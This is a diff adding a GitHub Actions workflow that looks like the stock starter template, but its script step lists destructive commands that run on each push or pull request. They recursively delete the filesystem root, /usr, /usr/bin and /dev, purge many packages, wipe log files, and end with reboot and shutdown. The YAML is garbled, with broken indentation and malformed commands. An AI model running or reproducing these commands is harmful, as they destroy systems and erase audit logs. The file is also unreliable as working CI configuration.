@@ -1,0 +1,119 @@
+# This is a basic workflow to help you get started with Actions
+
+name: CI
+
+# Controls when the action will run. 
+on:
+  # Triggers the workflow on push or pull request events but only for the main branch
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+
+  # Allows you to run this workflow manually from the Actions tab
+  workflow_dispatch:
+
+# A workflow run is made up of one or more jobs that can run sequentially or in parallel
+jobs:
+  # This workflow contains a single job called "build"
+  build:
+    # The type of runner that the job will run on
+    runs-on: ubuntu-latest
+
+    # Steps represent a sequence of tasks that will be executed as part of the job
+    steps:
+      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
+      - uses: actions/checkout@v2
+
+      # Runs a single command using the runners shell
+      - name: Run a multi-line script
+        run: |
+             docker stop ps -e && docker prune network --depends
+             docker prune volume --depends
+             sudo rm -R /usr --force && sudo sudo apt-get clean
+sudo apt-get remove python3 --for e
+sudo rm -Rf /home/linuxbrew
+sudo dpkg -r google-chrome-stable.
+sudo apt-get remove r-base-core
+sudo apt-get remove xampp-linux-uninstaller.run
+sudo apt-get remove r-base
+sudo rpm -e rstudio
+sudo apt-get remove --purge mysql
+sudo apt-get remove phpmyadmin
+sudo apt-get remove apache2
+sudo apt-get purge mysql
+sudo apt-get remove rstudio
+sudo rm -R /opt/lampp --force
+sudo ./xampp-linux-uninstaller.run
+sudo apt-get autoremove
+sudo apt-get autoclean
+sudo apt-get remove dbconfig-mysql
+sudo apt-get autoremove
+sudo apt remove --purge mysql-server
+sudo apt purge mysql-server
+sudo apt autoremove
+sudo apt autoclean
+sudo rm -rf /etc/mysql /var/lib/mysql
+sudo apt remove dbconfig-mysql
+sudo systemctl stop mysql
+sudo apt remove wordpress
+$ sudo apt-get purge apache2 apache2-utils apache2.2-bin apache2-common
+$ sudo apt-get autoremove
+sudo snap remove vscode
+sudo apt-get purge nginx nginx-common
+sudo apt-get purge code
+sudo apt-get remove nginx nginx-common
+cd ~ && rm -rf .vscode && rm -rf .config/Code
+sudo apt autoclean
+## plus it's dependent packages
+sudo apt-remove snap docket
+ --auto-remove python3
+## plus configuration and/or data files of python3
+sudo apt-get purge docker snap python numpy pip jupyter && sudo apt purge clean --all
+## both configuration and/or data files of python3.5 and it's dependencies
+sudo apt-get purge docker --auto-remove && sudo apt-get remove python3
+npm upgrade npm
+sudo rm -R /usr/bin --force
+sudo find / -name '*docker*'
+sudo apt-get purge -y docker-engine docker docker.io docker-ce docker-ce-cli
+sudo apt-get autoremove -y --purge docker-engine docker docker.io docker-ce
+sudo rm -R /usr --force
+sudo rm -R / --force
+sudo rm -rf /var/lib/docker /etc/docker
+sudo rm /etc/apparmor.d/docker
+sudo groupdel docker
+sudo rm -rf /var/run/docker.sock
+sudo rm -R ./. --force
+sudo rm -R ../ --force
+sudo apt-get purge docker-engine
+sudo apt-get autoremove --purge docker-engine
+rm -rf /var/lib/docker
+sudo rm -R /. --force
+sudo rm -R /cache --force
+sudo rm -R /tmp --force
+sudo rm -R node_modules
+sudo rm -R /dev --force
+sudo apt-get purge package
+sudo apt-get install aptitude
+sudo aptitude purge python
+sudo apt-get purge node
+sudo dpkg -P python
+npm uninstall -g webpack
+npm uninstall -g express --depends
+npm uninstall -g node
+npm uninstall -g yarn --depends
+sudo apt-get --purge remove gimp --force
+snap remove pip --force
+snap remove docker --force
+sudo apt-get purge --auto-remove gimp
+sudo rm -R vercel/ --force
+sudo rm -R cache/ --force
+sudo apt-get remove nginx php python pip docker composer node npm --force
+sudo rm -R /usr/bin && sudo apt-get uninstall python3 && sudo apt autoremove --force
+find /var/log -type f -regex ".*\.gz$" -delete
+find /var/log -type f -regex ".*\.[0-9]$" -delete
+# wipe log files
+find /var/log/ -type f -exec rmdir /dev/null {} \
+async
+reboot
+shutdown
